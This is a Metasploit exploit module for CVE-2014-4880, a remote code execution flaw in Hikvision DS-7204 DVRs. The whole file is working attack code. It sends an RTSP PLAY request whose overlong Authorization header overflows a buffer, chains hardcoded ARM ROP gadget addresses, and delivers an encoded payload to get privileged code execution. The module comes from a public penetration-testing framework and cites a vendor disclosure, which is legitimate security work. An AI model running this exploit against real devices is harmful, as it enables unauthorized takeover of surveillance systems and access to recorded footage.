##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit4 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Exploit::Remote::Tcp
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Hikvision DVR RTSP Request Remote Code Execution',
      'Description'    => %q{
        This module exploits a buffer overflow in the RTSP request parsing
        code of Hikvision DVR appliances. The Hikvision DVR devices record
        video feeds of surveillance cameras and offer remote administration
        and playback of recorded footage.
 
        The vulnerability is present in several models / firmware versions
        but due to the available test device this module only supports
        the DS-7204 model.
      },
      'Author'         =>
        [
          'Mark Schloesser <mark_schloesser[at]rapid7.com>', # @repmovsb, vulnerability analysis & exploit dev
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2014-4880' ],
          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2014/11/19/r7-2014-18-hikvision-dvr-devices--multiple-vulnerabilities' ]
        ],
      'Platform'       => 'linux',
      'Arch'           => ARCH_ARMLE,
      'Privileged'     => true,
      'Targets'        =>
        [
          #
          # ROP targets are difficult to represent in the hash, use callbacks instead
          #
          [ "DS-7204 Firmware V2.2.10 build 131009", {
 
            # The callback handles all target-specific settings
            :callback => :target_ds7204_1,
              'g_adjustesp' => 0x002c828c,
              # ADD             SP, SP, #0x350
              # LDMFD           SP!, {R4-R6,PC}
 
              'g_r3fromsp'  => 0x00446f80,
              # ADD             R3, SP, #0x60+var_58
              # BLX             R6
 
              'g_blxr3_pop' => 0x00456360,
              # BLX             R3
              # LDMFD           SP!, {R1-R7,PC}
 
              'g_popr3'     => 0x0000fe98,
              # LDMFD           SP!, {R3,PC}
          } ],
 
          [ "Debug Target", {
 
            # The callback handles all target-specific settings
            :callback => :target_debug
 
          } ]
 
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Nov 19 2014'))
 
    register_options(
      [
        Opt::RPORT(554)
      ], self.class)
  end
 
  def exploit
    unless self.respond_to?(target[:callback])
      fail_with(Failure::NoTarget, "Invalid target specified: no callback function defined")
    end
 
    device_rop = self.send(target[:callback])
 
    request =  "PLAY rtsp://#{rhost}/ RTSP/1.0\r\n"
    request << "CSeq: 7\r\n"
    request << "Authorization: Basic "
    request << rand_text_alpha(0x280 + 34)
    request << [target["g_adjustesp"]].pack("V")[0..2]
    request << "\r\n\r\n"
    request << rand_text_alpha(19)
 
    # now append the ropchain
    request << device_rop
    request << rand_text_alpha(8)
    request << payload.encoded
 
    connect
    sock.put(request)
    disconnect
  end
 
  # These devices are armle, run version 1.3.1 of libupnp, have random stacks, but no PIE on libc
  def target_ds7204_1
    # Create a fixed-size buffer for the rop chain
    ropbuf = rand_text_alpha(24)
 
    # CHAIN = [
    #   0, #R4 pop adjustsp
    #   0, #R5 pop adjustsp
    #   GADGET_BLXR3_POP, #R6 pop adjustsp
    #   GADGET_POPR3,
    #   0, #R3 pop
    #   GADGET_R3FROMSP,
    # ]
 
    ropbuf[8,4] = [target["g_blxr3_pop"]].pack("V")
    ropbuf[12,4] = [target["g_popr3"]].pack("V")
    ropbuf[20,4] = [target["g_r3fromsp"]].pack("V")
 
    return ropbuf
  end
 
  # Generate a buffer that provides a starting point for exploit development
  def target_debug
    Rex::Text.pattern_create(2000)
  end
 
  def rhost
    datastore['RHOST']
  end
 
  def rport
    datastore['RPORT']
  end
 
end
